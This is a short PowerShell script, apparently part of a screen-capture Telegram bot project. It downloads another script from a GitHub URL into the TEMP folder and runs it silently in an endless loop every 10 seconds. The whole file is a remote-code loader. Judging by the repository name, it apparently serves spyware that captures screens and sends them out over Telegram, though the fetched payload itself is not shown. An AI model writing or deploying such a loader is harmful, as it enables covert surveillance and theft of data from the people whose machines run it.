# scheduler.ps1
# Define paths and URLs
$scriptUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/main/src/Combined2.ps1"
$localScriptPath = "$env:TEMP\Combined2.ps1"

# Download the latest Combined2.ps1 from GitHub
Invoke-WebRequest -Uri $scriptUrl -OutFile $localScriptPath -UseBasicParsing

# Infinite loop to run the script every 10 seconds
while ($true) {
    # Execute the downloaded script silently
    try {
        & $localScriptPath
    } catch {
        Write-Output "Error running script: $_"
    }
    # Wait 10 seconds before the next run
    Start-Sleep -Seconds 10
}
